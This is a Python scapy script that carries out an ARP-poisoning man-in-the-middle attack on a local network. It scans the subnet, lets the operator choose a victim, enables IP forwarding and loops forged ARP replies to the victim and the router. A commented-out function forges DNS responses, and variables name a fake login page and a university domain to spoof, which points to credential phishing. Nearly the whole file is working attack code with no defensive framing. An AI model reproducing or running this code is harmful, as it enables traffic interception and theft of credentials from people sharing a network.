#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue May  5 03:59:29 2020

@author: root
"""
from scapy.all import *
from scapy.all import ARP, send, DNS, DNSRR, UDP, IP, sniff, DNSQR, sr1
import netifaces as ni
import ipaddress
import os
import sys 
import time
import threading
from netfilterqueue import NetfilterQueue
"""
def fake_dns_response(pkt):
    if (pkt[IP].src != "127.0.0.1" and pkt[IP].src != thisIP):
        forged_DNSRR = DNSRR(
            rrname=pkt[DNS].qd.qname, ttl=3600, rdlen=4, rdata=thisIP)
        forged_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) /\
        UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /\
        DNS(id=pkt[DNS].id, qr=1, aa=1,
            qd=pkt[DNS].qd, an=forged_DNSRR)
        send(forged_pkt, verbose=0)
        print(("\nmitm : dns > Redirect %s from %s to %s") % (pkt[IP].src, pkt[DNS].qd.qname, thisIP))
"""
def retrieve_network_devices(target_ip = "192.168.1.1/24"):
    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=2)[0]
    return result
    
def enable_forward():
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def disable_forward():
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
    
def arp_poison(gatewayIP, gatewayMAC, victimIP, victimMAC):
    toRouter = ARP(op=2, pdst=gatewayIP, hwdst=gatewayMAC, psrc=victimIP)
    send(toRouter)
    print('spoof package sent to router')
    toVictim = ARP(op=2, pdst=victimIP, hwdst=victimMAC, psrc=gatewayIP)
    send(toVictim)
    print('spoof package sent to victim')
    
    

enable_forward()

routerIP = ni.gateways()['default'][ni.AF_INET][0]
routerMAC = ""
interf = ni.gateways()['default'][ni.AF_INET][1]
mask = ni.ifaddresses(interf)[ni.AF_INET][0]['netmask']
thisIP = ni.ifaddresses(interf)[ni.AF_INET][0]['addr']
thisMAC = ni.ifaddresses(interf)[ni.AF_LINK][0]['addr']
fakeLogIn = 'http://140.113.207.246/login.php'
spoofThisAddress = 'nctu.edu.tw'


print('router : ',routerIP)
print('interface : ',interf)
print('subnetmask : ',mask)

network = ipaddress.IPv4Network(routerIP + '/' + mask, False)
routerIPWMask = routerIP + '/' + network.compressed.split('/')[1]

resultsMAC = []
resultsIP = []
for i in range(5):
    res = retrieve_network_devices(routerIPWMask)
    for sent, received in res:
        resultsMAC.append(received.hwsrc)
        resultsIP.append(received.psrc)

print()
print()
print('The results:')

network_devices = []
for i in range(len(resultsIP)):
    if (resultsIP[i],resultsMAC[i]) not in network_devices:
        network_devices.append((resultsIP[i],resultsMAC[i]))
    if (resultsIP[i] == routerIP):
        routerMAC = resultsMAC[i]

for i in range(len(network_devices)):
    print(i,network_devices[i])

selection = int(input('select ip by number '))
print(network_devices[selection], 'selected')

victimIP = network_devices[selection][0]
victimMAC = network_devices[selection][1]

def restore(target, host):
    a = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=target), timeout=3, verbose=0)
    macTarget = a[0][1].src
    macHost = a[0][1].src
    arp = ARP(pdst=target, hwdst=macTarget, psrc=host,op='is-at')
    send(arp)


def arp_poison_loop():
    print('poisoning started')
    try:
        while True:
            arp_poison(routerIP, routerMAC, victimIP, victimMAC)
            time.sleep(2)
    except KeyboardInterrupt:
        print("restoring")
        arp_victim = ARP(pdst=victimIP, hwdst=victimMAC, psrc=routerIP, hwsrc=routerMAC,op='is-at')
        send(arp_victim)
        arp_router = ARP(pdst=routerIP, hwdst=routerMAC, psrc=victimIP, hwsrc=victimMAC,op='is-at')
        send(arp_router)
        disable_forward()
        print("restored")


arp_poison_loop()